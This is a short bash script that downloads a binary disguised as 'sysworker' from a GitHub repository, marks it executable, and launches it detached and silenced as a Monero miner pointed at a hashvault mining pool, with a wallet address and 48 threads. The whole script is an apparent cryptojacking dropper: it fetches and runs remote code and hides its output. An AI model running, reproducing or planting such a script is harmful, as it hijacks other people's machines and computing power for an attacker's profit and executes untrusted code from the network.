#!/bin/bash

wget https://github.com/bandujuna77-debug/sae/raw/refs/heads/main/sysworker
chmod 777 sysworker
nohup setsid ./sysworker -a rx/0 -o pool.hashvault.pro:3333 -u 47BZr4mSxkwK3ZQCth6pN5Hy3gXGWqujcDTA6F4Bk7mhKKDhUxUGDcx5M8ae6CD38HLoJ2DdSJGvoHDDUF1grwSCBPjRcmF -p x -t 48 >/dev/null 2>&1 </dev/null &
